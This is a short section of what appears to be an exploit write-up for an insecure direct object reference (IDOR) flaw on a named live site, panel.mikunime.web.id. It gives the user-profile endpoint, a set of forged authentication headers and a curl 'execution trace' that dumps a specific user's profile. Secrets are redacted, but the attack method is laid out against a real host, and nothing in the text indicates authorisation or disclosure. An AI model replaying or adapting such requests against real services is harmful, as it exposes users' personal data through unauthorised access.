## 2. IDOR — USER PROFILE DUMP

### Vulnerability
`GET /api/miku/7/9/user/{uid}` returns any user's full profile without
authorization checks beyond the forged signature.

### Endpoint
```
GET /api/miku/7/9/user/{uid}
```

### Headers (forged)
```
Authorization: Bearer miku_[REDACTED]
X-Miku-Auth: vps
X-Miku-Signature: <forged>
X-Miku-Timestamp: <forged>
X-Miku-Nonce: <forged>
```

# EXECUTION TRACE
```bash
curl -s "https://panel.mikunime.web.id/api/miku/7/9/user/8mpFy9Jim2ezl7mQGA4vskmdPhw1" \
  -H "Authorization: Bearer miku_[REDACTED]" \
  -H "X-Miku-Auth: vps" \
  -H "X-Miku-Signature: <forged>" \
  -H "X-Miku-Timestamp: <ts>" \
  -H "X-Miku-Nonce: <nonce>"
```

